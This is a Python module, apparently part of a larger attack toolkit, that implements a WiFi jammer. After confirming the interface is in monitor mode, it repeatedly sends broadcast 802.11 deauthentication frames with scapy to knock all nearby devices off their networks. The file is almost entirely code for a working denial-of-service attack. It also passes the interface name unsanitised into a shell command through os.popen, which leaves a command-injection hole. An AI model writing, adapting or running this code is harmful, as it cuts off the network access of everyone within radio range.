# modules/wifi_jammer.py
import scapy.all as scapy
import time
import logging
import os

log = logging.getLogger(__name__)

def attack(iface, duration=60):
    """
    Melakukan jamming WiFi dengan mengirim deauthentication frames ke semua perangkat.
    Memerlukan interface dalam monitor mode.
    """

    # Cek apakah interface dalam monitor mode
    try:
        iwconfig_output = os.popen(f"iwconfig {iface}").read()
        if "Monitor" not in iwconfig_output:
            log.error(f"Interface {iface} is not in monitor mode. Please set it to monitor mode first.")
            return
    except Exception as e:
        log.error(f"Error checking interface mode: {e}")
        return

    # Broadcast MAC address
    broadcast_mac = "ff:ff:ff:ff:ff:ff"

    # Buat paket deauthentication
    dot11 = scapy.Dot11(addr1=broadcast_mac, addr2=broadcast_mac, addr3=broadcast_mac)
    packet = scapy.RadioTap()/dot11/scapy.Dot11Deauth(reason=7)

    # Kirim paket secara berulang
    start_time = time.time()
    end_time = start_time + duration
    packets_sent = 0
    try:
        while time.time() < end_time:
            scapy.sendp(packet, iface=iface, verbose=False)
            packets_sent += 1
    except KeyboardInterrupt:
        pass
    except Exception as e:
      log.exception(f"Error: {e}")
    finally:
        log.info(f"WiFi jamming finished. Sent {packets_sent} deauthentication packets.")